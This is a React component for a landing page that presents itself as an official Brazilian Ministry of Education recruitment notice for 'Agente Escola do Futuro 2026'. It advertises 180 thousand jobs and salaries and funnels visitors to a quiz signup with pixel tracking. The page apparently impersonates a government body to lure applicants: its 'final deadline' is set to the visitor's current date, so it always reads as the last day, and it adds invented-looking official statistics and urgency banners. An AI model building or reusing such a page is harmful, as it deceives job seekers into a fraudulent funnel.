import React, { memo, useMemo } from "react";
import useUtmNavigator from "../hooks/useUtmNavigator";
import { usePixelTracking } from '../hooks/usePixelTracking';
import { appendUtm } from '../utils/utm';

const Main: React.FC = memo(() => {
	usePixelTracking();
	
	const navigate = useUtmNavigator();

	// Memoizar a data atual para evitar recálculos
	const currentDate = useMemo(() => {
		const date = new Date();
		const day = String(date.getDate()).padStart(2, '0');
		const month = String(date.getMonth() + 1).padStart(2, '0');
		const year = date.getFullYear();
		return `${day}/${month}/${year}`;
	}, []);

	// Memoizar handlers para evitar re-renders
	const shareHandlers = useMemo(() => ({
		facebook: () => {
			const url = window.location.href;
			const shareUrl = appendUtm(url);
			window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}`, '_blank');
		},
		twitter: () => {
			const url = window.location.href;
			const shareUrl = appendUtm(url);
			const title = 'Portal Agente Escola';
			window.open(`https://twitter.com/intent/tweet?url=${encodeURIComponent(shareUrl)}&text=${encodeURIComponent(title)}`, '_blank');
		},
		whatsapp: () => {
			const url = window.location.href;
			const shareUrl = appendUtm(url);
			const title = 'Portal Agente Escola';
			window.open(`https://wa.me/?text=${encodeURIComponent(title + ' ' + shareUrl)}`, '_blank');
		},
		copyLink: () => {
			navigator.clipboard.writeText(appendUtm(window.location.href));
		}
	}), []);

	const handleInscricaoClick = () => navigate("/quiz");
	const handleAreaInscricaoClick = () => navigate("/quiz");

	return (
		<main className="container mx-auto px-1 py-2 flex-grow">
			{/* Header Section - Carregamento prioritário */}
			<div className="px-4 py-4">
				<h1 className="text-3xl font-semibold mb-4 text-blue-800">AGENTE ESCOLA DO FUTURO 2026</h1>
				
				{/* Share Section - Simplificada */}
				<div className="border-t border-b border-gray-300 py-3">
					<div className="flex items-center mb-2">
						<span className="text-gray-700 mr-2 text-sm">Compartilhe:</span>
						<button 
							className="text-blue-700 mx-1 hover:text-blue-800" 
							onClick={shareHandlers.facebook}
							aria-label="Compartilhar no Facebook"
						>
							<svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
								<path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
							</svg>
						</button>
						<button 
							className="text-blue-700 mx-1 hover:text-blue-800" 
							onClick={shareHandlers.twitter}
							aria-label="Compartilhar no Twitter"
						>
							<svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
								<path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
							</svg>
						</button>
						<button 
							className="text-blue-700 mx-1 hover:text-blue-800" 
							onClick={shareHandlers.whatsapp}
							aria-label="Compartilhar no WhatsApp"
						>
							<svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
								<path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
							</svg>
						</button>
						<button 
							className="text-blue-700 mx-1 hover:text-blue-800" 
							onClick={shareHandlers.copyLink}
							aria-label="Copiar link"
						>
							<svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
								<path d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/>
							</svg>
						</button>
					</div>
					<div className="text-gray-700 text-sm">
						<p>Publicado em 16/12/2025 17h37</p>
						<p>Atualizado em 17/12/2025 00h29</p>
					</div>
				</div>

				{/* Hero Section */}
				<div className="py-4">
					<h2 className="text-2xl font-bold mb-4">GOVERNO FEDERAL - MINISTÉRIO DA EDUCAÇÃO</h2>
					<h4 className="text-xl font-semibold mb-2 text-blue-800">AGENTE ESCOLA DO FUTURO - PND</h4>
					<img 
						src="https://i.ibb.co/JRSY7bdC/IMAGEM.webp" 
						alt="Logo" 
						loading="eager"
						className="max-w-full h-auto"
					/>
					<h5 className="text-1xl font-bold mb-4">COMUNICADO OFICIAL - ÚLTIMO DIA DE INSCRIÇÃO</h5>
				</div>
			</div>

			{/* Content Section */}
			<div className="max-w-4xl mx-auto p-4">
				<h1 className="text-[#0C336F] text-lg leading-7 font-bold mb-4">Sobre o Programa</h1>

				<div className="space-y-6">
					<p className="text-[17px] leading-relaxed text-[#333333]">
						O programa Agente Escola do Futuro é uma iniciativa do Governo Federal que marca a ampliação na contratação, formação e atuação de profissionais nas escolas públicas de todo o país. Neste novo momento, o programa abre vagas para novos agentes por meio de um processo seletivo nacional, permitindo que qualquer cidadão brasileiro participe da seleção.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						Os aprovados receberão formação técnica gratuita e passarão a atuar diretamente em escolas públicas próximas de suas residências, fortalecendo o vínculo com a comunidade escolar e promovendo a integração entre a escola, os alunos e as famílias. As atribuições incluem auxílio na organização das salas e espaços escolares, apoio na entrada e saída dos alunos, colaboração em atividades educativas e recreativas, além de apoio no atendimento às famílias e à comunidade escolar.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						Os salários variam entre R$ <span className="text-[#1351B4] font-semibold">3.456,13</span> e R$
						<span className="text-[#1351B4] font-semibold">4.290,71</span>, dependendo da região e da
						modalidade de atuação.
					</p>

					<p className="text-[17px] leading-relaxed text-[#333333]">
						A estratégia tem como objetivo preparar os agentes para novas atribuições e para os desafios atuais do ambiente escolar, como o aumento das demandas sociais e educacionais que impactam diretamente o desempenho e bem-estar dos estudantes. Com agentes mais capacitados e em maior número, será possível identificar com mais precisão as necessidades da comunidade escolar e oferecer um apoio mais resolutivo, justo e participativo.
					</p>

					{/* Image - Lazy loading para melhor performance */}
					<div className="flex justify-center my-6">
						<img
							src="https://i.ibb.co/HTPs0QC8/Escol-A-4.png"
							alt="Grupo de voluntários abraçados representando união e colaboração"
							loading="lazy"
							className="rounded-lg shadow-lg max-w-full h-auto"
						/>
					</div>

					{/* Info Cards - Otimizado */}
					<div className="bg-white shadow-md rounded-lg border-2 border-[#1351B4] overflow-hidden">
						<div className="bg-[#1351B4] py-4 px-6">
							<h3 className="text-xl font-bold text-white uppercase text-center">
								Informações Importantes
							</h3>
						</div>
						<div className="p-6 bg-gray-50">
							<div className="grid grid-cols-1 md:grid-cols-3 gap-4">
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Oportunidade:</div>
									<div className="text-2xl font-bold text-[#1351B4]">180 MIL</div>
									<div className="text-gray-700 font-medium mt-1">novas vagas disponíveis</div>
								</div>
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Salário Inicial:</div>
									<div className="text-2xl font-bold text-[#1351B4]">R$ 3.456,13</div>
									<div className="text-gray-700 font-medium mt-1">podendo chegar a R$ 4.290,71</div>
								</div>
								<div className="bg-white p-4 rounded-lg border-l-4 border-[#1351B4] shadow-sm">
									<div className="text-gray-700 font-bold uppercase text-sm mb-2">Escolaridade:</div>
									<div className="text-2xl font-bold text-[#1351B4]">ENSINO MÉDIO</div>
									<div className="text-gray-700 font-medium mt-1">nível da prova</div>
								</div>
							</div>
							<div className="mt-6 bg-blue-50 p-3 border border-blue-100 rounded-lg text-center">
								<span className="text-sm font-bold text-[#1351B4]">Oportunidade: Ingresso rápido em carreira pública</span>
							</div>
						</div>
					</div>

					{/* CTA Section - Prioridade alta */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div 
							className="bg-[#1351B4] text-white p-4 text-xl font-semibold cursor-pointer hover:bg-[#1351B4]/90 transition-colors"
							onClick={handleAreaInscricaoClick}
						>
							Acessar Área de Inscrições
						</div>
						<div className="p-6 text-center">
							<p className="text-red-600 font-medium mb-4">INSCREVA-SE AGORA! VAGAS LIMITADAS</p>
							<button
								onClick={handleInscricaoClick}
								className="bg-[#1351B4] text-white py-3 px-8 rounded-full font-semibold hover:bg-[#1351B4]/90 transition-colors mb-4 text-lg"
							>
								Fazer Inscrição
							</button>
							<p className="text-gray-600">Prazo final: {currentDate}</p>
						</div>
					</div>

					{/* Results Section - Lazy load */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div className="bg-[#1351B4] text-white p-4 text-xl font-semibold">Resultados</div>
						<div className="p-6">
							<ul className="space-y-3 list-disc pl-4">
								<li>
									<span className="text-[#1351B4] font-semibold">83.412</span> mil inscrições homologadas
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">5.452</span> municípios aderiram ao programa (<span className="text-[#1351B4]">98%</span>)
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">4 mil</span> tutoras(es) e mais de <span className="text-[#1351B4] font-semibold">10 mil</span> preceptoras(es) envolvidas(os)
								</li>
								<li>
									<span className="text-[#1351B4] font-semibold">88%</span> dos estudantes diplomadas(os) até fevereiro de <span className="text-[#1351B4]">2026</span>
								</li>
							</ul>
						</div>
					</div>

					{/* Contact Section */}
					<div className="mt-8 border border-gray-200 overflow-hidden">
						<div className="bg-[#1351B4] text-white p-4 text-xl font-semibold">Ouvidoria Geral do MEC</div>
						<div className="p-6">
							<p className="text-gray-700">
								Teleatendente: de segunda-feira a sexta-feira, das 8h às 20h, e aos sábados, das 8h às 18h.
							</p>
						</div>
					</div>
				</div>
			</div>
		</main>
	);
});

Main.displayName = 'Main';

export default Main;
